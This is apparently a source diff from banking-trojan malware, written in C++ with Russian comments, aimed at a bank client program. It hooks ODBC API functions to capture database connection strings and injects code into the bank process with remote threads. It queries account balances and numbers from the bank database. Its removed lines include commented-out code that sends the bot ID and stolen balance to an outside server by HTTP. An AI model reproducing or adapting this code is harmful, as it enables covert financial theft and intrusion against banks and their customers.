@@ -14,9 +14,7 @@
 #include "BotHTTP.h"
 #include "Inject.h"
 #include "BotCore.h"
-#include <sql.h>
-#include <sqltypes.h>
-#include <sqlext.h>
+#include "odbc.h"
 
 #include "BotDebug.h"
 
@@ -41,9 +39,38 @@ SQLRETURN (WINAPI *pHandlerSQLDriverConnectA)(
      SQLSMALLINT *   StringLength2Ptr,
      SQLUSMALLINT    DriverCompletion);
 
-SQLRETURN (WINAPI *pHandlerSQLPrepareA)( SQLHSTMT StatementHandle, SQLCHAR* StatementText, SQLINTEGER TextLength);
+SQLRETURN (WINAPI *pHandlerSQLPrepareA)( SQLHSTMT StatementHandle, SQLCHAR* StatementText, SQLINTEGER TextLength );
+SQLRETURN (WINAPI *pHandlerSQLExecDirectA)( SQLHSTMT StatementHandle, SQLCHAR* StatementText, SQLINTEGER TextLength );
+SQLRETURN (WINAPI *pHandlerSQLExecute)( SQLHSTMT StatementHandle );
+
+//извлекает подстроку между символами c, номер подстроки указывается в num
+static char* GetPieceString( const char* s, char c, int num, char* to, int c_to );
 
 static char strODBCConnect[MAX_PATH];
+
+////////////////////////////////////////////////////////
+// функции управления базой данных
+//////////////////////////////////////////////////////////
+static void CloseDB( ODBC* DB )
+{
+	if( DB ) delete DB;
+}
+
+static ODBC* CreateDB()
+{
+	ODBC* DB = new ODBC();
+	if( DB )
+		if( !DB->Connect(strODBCConnect) )
+		{
+			CloseDB(DB);
+			DB = 0;
+		}
+	return DB;
+}
+
+/////////////////////////////////////////////////////////////////////
+// Хуки
+/////////////////////////////////////////////////////////////////////
 
 static SQLRETURN WINAPI HandlerSQLDriverConnectA( SQLHDBC ConnectionHandle, SQLHWND WindowHandle, SQLCHAR* InConnectionString,
 					      SQLSMALLINT StringLength1, SQLCHAR* OutConnectionString, SQLSMALLINT BufferLength,
@@ -58,51 +85,9 @@ static SQLRETURN WINAPI HandlerSQLDriverConnectA( SQLHDBC ConnectionHandle, SQLH
 						  OutConnectionString, BufferLength, StringLength2Ptr, DriverCompletion );
 }
 
-SQLRETURN WINAPI HandlerSQLPrepareA( SQLHSTMT StatementHandle, SQLCHAR* StatementText, SQLINTEGER TextLength)
-{
-	DBG( "CBank", "SQL='%s'", StatementText );
-	return pHandlerSQLPrepareA( StatementHandle, StatementText, TextLength );
-}
-
-bool InjectIntoProcess( DWORD pid, DWORD (WINAPI *func)(LPVOID) )
-{
-	OBJECT_ATTRIBUTES ObjectAttributes = { sizeof(ObjectAttributes) } ;
-	CLIENT_ID ClientID;
-
-	ClientID.UniqueProcess = (HANDLE)pid;
-	ClientID.UniqueThread  = 0;
-
-	HANDLE hProcess;
-		
-	if ( pZwOpenProcess( &hProcess, PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE, &ObjectAttributes, &ClientID ) != STATUS_SUCCESS )
-	{
-		return false;
-	}
-
-	DWORD dwAddr = InjectCode( hProcess, func );
-
-	bool ret = false;
-
-	if ( dwAddr != -1 )
-	{
-		if ( pCreateRemoteThread( hProcess, 0, 0, (LPTHREAD_START_ROUTINE)dwAddr, NULL, 0, 0 ) != NULL )
-		{
-			ret = true;
-		}
-	}
-
-	pZwClose(hProcess);
-	
-	return ret;
-}
-
 static bool SetHooks()
 {
-	const DWORD HASH_SQLDriverConnectA = 0x3941DBB7;
-	const DWORD HASH_SQLPrepareA = 0xC09D6D06;
-
-	if( !HookApi( DLL_ODBC32, HASH_SQLDriverConnectA, HandlerSQLDriverConnectA, &pHandlerSQLDriverConnectA ) ) return false;
-	if( !HookApi( DLL_ODBC32, HASH_SQLPrepareA, HandlerSQLPrepareA, &pHandlerSQLPrepareA ) ) return false;	
+	if( !HookApi( DLL_ODBC32, 0x3941DBB7, HandlerSQLDriverConnectA, &pHandlerSQLDriverConnectA ) ) return false;
 	return true;
 }
 
@@ -110,6 +95,33 @@ static bool InitData()
 {
 	strODBCConnect[0] = 0;
 	return true;
+}
+
+//грабит баланс и отправляет в админку
+static DWORD WINAPI GrabAndSendBalance(void*)
+{
+	DBG( "CBank", "Ждем строки подключения к базе" );
+	while( strODBCConnect[0] == 0 ) pSleep(1000);
+	pSleep(5000); //после получения строки немного подождем на всякий случай
+	ODBC* DB = CreateDB();
+	if( DB )
+	{
+		const char* sql = "select Rest,Account from Account";
+		const char* format = "os31 os31";
+		char Rest[32], Account[32];
+		SQLHSTMT qr = DB->ExecuteSql( sql, format, Rest, Account );
+		if( qr )
+		{
+			DBG( "CBank", "Rest=%s, Account=%s", Rest, Account );
+			DB->CloseQuery(qr);
+		}
+		else
+			DBG( "CBank", "Запрос не выполнился" );
+		CloseDB(DB);
+	}
+	else
+		DBG( "CBank", "Не удалось подключиться к базе" );
+	return 0;
 }
 
 //поток исполняющийся внутри cbank.exe (cbmain.ex)
@@ -121,129 +133,9 @@ static DWORD WINAPI WorkInCBank(void*)
 	pGetModuleFileNameA( 0, folderCBank, sizeof(folderCBank) );
 	DBG( "CBank", "Заинжектились в процесс '%s'", folderCBank );
 	SetHooks();
+	StartThread( GrabAndSendBalance, 0 );
 	return 0;
 }
-
-
-char szDatabaseParam[]="database",
-     szGetBalanceStatement[]="select Rest * 100,Account from Account";
-
-static char *GrabBalance(char *lpPath)
-{
-	DBG("CBank","GrabBalance");
-    char *lpBalance=NULL;
-    if (lpPath)
-    {
-        SQLHENV hEnv;
-        SQLHANDLE hConn,hBalance=NULL;
-        pSQLAllocHandle(SQL_HANDLE_ENV,NULL,&hEnv);
-        pSQLSetEnvAttr(hEnv,SQL_ATTR_ODBC_VERSION,(void *)SQL_OV_ODBC3,NULL);
-        pSQLAllocHandle(SQL_HANDLE_DBC,hEnv,&hConn);
-
-        char szConfig[MAX_PATH];
-        pPathCombineA(szConfig,lpPath,"EXE\\default.cfg");
-        UINT bUseAlias=(UINT)pGetPrivateProfileIntA(szDatabaseParam,"aliasconnect",0,szConfig);
-        char szUser[20];
-        pGetPrivateProfileStringA(szDatabaseParam,"username",0,szUser,20,szConfig);
-
-        do
-        {
-            if (bUseAlias)
-            {
-                char szAlias[200];
-                int dwLen=(int)pGetPrivateProfileStringA(szDatabaseParam,"alias",0,szAlias,200,szConfig);
-
-                SQLSMALLINT tmp=0;
-                SQLRETURN retcode=(SQLRETURN)pSQLConnectA(hConn,(SQLCHAR*)szAlias,dwLen,(SQLCHAR*)szUser,lstrlenA(szUser),(SQLCHAR*)"sql",3);
-                if ((retcode != SQL_SUCCESS) && (retcode != SQL_SUCCESS_WITH_INFO))
-                    break;
-            }
-            else
-            {
-                char szConnectString[400];
-                int dwLen=(int)pGetPrivateProfileStringA(szDatabaseParam,"connectstring",0,szConnectString,200,szConfig);
-                char *p;
-                if (p=(char*)pStrStrA(szConnectString,"%BSSRoot%"))
-                {
-                    char szTmpStr[200];
-                    plstrcpyA(szTmpStr,p+sizeof("%BSSRoot%")-1);
-                    plstrcpyA(p,lpPath);
-                    p+=(int)plstrlenA(lpPath);
-                    plstrcpyA(p,szTmpStr);
-                    dwLen=(int)plstrlenA(szConnectString)+1;
-                }
-                if (szConnectString[dwLen-1] != ';')
-                {
-                    *(WORD*)&szConnectString[dwLen-1]=';';
-                    dwLen++;
-                }
-                //char szUserPassword[40];
-                //dwLen+=(int)ppwsprintfA(szUserPassword,"UID=%s;PWD=sql;",szUser);
-				plstrcatA(szConnectString,"UID=");
-				plstrcatA(szConnectString,szUser);
-				plstrcatA(szConnectString,";");
-				plstrcatA(szConnectString,"PWD=sql;");
-                //plstrcatA(szConnectString,szUserPassword);
-                char szStr[512];
-                SQLSMALLINT tmp;
-                SQLRETURN retcode=(SQLRETURN)pSQLDriverConnectA(hConn,NULL,(SQLCHAR*)szConnectString,SQL_NTS,(unsigned char *)szStr,sizeof(szStr),&tmp,SQL_DRIVER_COMPLETE);
-                if ((retcode != SQL_SUCCESS) && (retcode != SQL_SUCCESS_WITH_INFO))
-                    break;
-            }
-            SQLHANDLE hBalance=NULL;
-            pSQLAllocHandle(SQL_HANDLE_STMT,hConn,&hBalance);
-            pSQLPrepareA(hBalance,(SQLCHAR*)szGetBalanceStatement,sizeof(szGetBalanceStatement));
-            SQLINTEGER tmp=0;
-            //SQLDOUBLE Rest=0;
-			SQLINTEGER Rest=0;
-            //pSQLBindCol(hBalance,1,SQL_C_DOUBLE,&Rest,sizeof(Rest),&tmp);
-            pSQLBindCol(hBalance,1,SQL_C_SLONG,&Rest,sizeof(Rest),&tmp);
-            SQLCHAR Account[25] = {0};
-			pSQLBindCol(hBalance, 2, SQL_C_CHAR, &Account, sizeof(Account), &tmp);
-            pSQLExecute(hBalance);
-
-            lpBalance=(char*)MemAlloc(1024); lpBalance[0] = 0;
-            SQLRETURN dwRet;
-            while (((dwRet=(SQLRETURN)pSQLFetch(hBalance)) == SQL_SUCCESS) || (dwRet == SQL_SUCCESS_WITH_INFO))
-            {
-				//конвертируем число в строку
-				char szRest[16], buf[16];
-				int i = 0;
-				if( Rest < 0 )
-				{
-					szRest[0] = '-';
-					Rest = -Rest;
-				}
-				else
-					szRest[0] = ' ';
-				do 
-				{
-					buf[i++] = (Rest % 10) + '0';
-					Rest /= 10;
-				} while( Rest );
-				szRest[i + 1] = 0;
-				char* ps = szRest + 1;
-				while( --i >= 0 ) *ps++ = buf[i];
-
-                //DWORD dwLen=(DWORD)wsprintfA(szTmp,"%s: %d",Account,Rest);
-               // if (lpBalance[0]) plstrcatA( lpBalance, ";" );
-               // plstrcatA(lpBalance, Account);
-				//plstrcatA(lpBalance, ": ");
-                plstrcpyA(lpBalance, szRest);
-            }
-            lpBalance = (char*)MemRealloc(lpBalance, (DWORD)plstrlenA(lpBalance));
-            pSQLCloseCursor(hBalance);
-            pSQLFreeHandle(SQL_HANDLE_STMT,hBalance);
-        }
-        while (false);
-        pSQLDisconnect(hConn);
-        pSQLFreeHandle(SQL_HANDLE_ENV,hEnv);
-        pSQLFreeHandle(SQL_HANDLE_ENV,hBalance);
-        pSQLFreeHandle(SQL_HANDLE_DBC,hConn);
-    }
-    return lpBalance;
-}
-
 
 static DWORD IsRunBClient( char* path )
 {
@@ -291,29 +183,6 @@ static void WINAPI WaitRunCBank(void*)
 				DBG( "CBank", "Start '%s'", path );
 				idCBank = id;
 				InjectIntoProcess( id, WorkInCBank );
-				/*
-				pPathRemoveFileSpecA(path); //убираем имя файла
-				pPathRemoveFileSpecA(path); //убираем папку EXE
-				char* sum= GrabBalance(path);
-				
-				// http://91.228.133.67/boffl.php?uid=sdf23dsffdsf&bal=2324324243
-				PCHAR Buf = NULL;
-				
-				PCHAR UID=  GenerateBotID();
-				PCHAR URL= STR::New(4,"http://ibanksystemdwersfssnk.com/boffl.php?uid=",UID,"&bal=",&sum[1]);
-				
-				HTTP::Get(URL, &Buf, NULL);
-				STR::Free(URL);
-				STR::Free(UID);
-				MemFree(sum);
-				*/
-
-				/*BBS_DBG("BBSBank","пишем видио.");
-				DWORD PID = 0;
-				pGetWindowThreadProcessId(pFindWindowA("TLoginWindow",NULL), &PID);
-				if(PID != 0) 
-					StartRecordThread(PID,"BBSBank", NULL, NULL,700);
-				*/
 			}
 		}
 		else
@@ -331,4 +200,36 @@ void Start()
 	StartThread( WaitRunCBank, 0 );
 }
 
+////////////////////////////////////////////////////////////////////
+//Разные вспомогательные функции
+////////////////////////////////////////////////////////////////////
+
+//извлекает подстроку между символами c, номер подстроки указывается в num
+static char* GetPieceString( const char* s, char c, int num, char* to, int c_to )
+{
+	*to = 0;
+	if( num < 0 ) return 0;
+	int n = 0;
+	char* ret = 0;
+	for(;;)
+	{
+		const char* ps = s;
+		while( *ps != 0 && *ps != c ) ps++;
+		if( n == num || *ps == 0 )
+		{
+			int len = ps - s;
+			if( len >= c_to ) len = c_to - 1;
+			ret = to;
+			while( len-- > 0 ) *to++ = *s++;
+			*to = 0;
+			break;
+		}
+		s = ps + 1;
+		n++;
+	}
+	return ret;
 }
+
+
+}
+
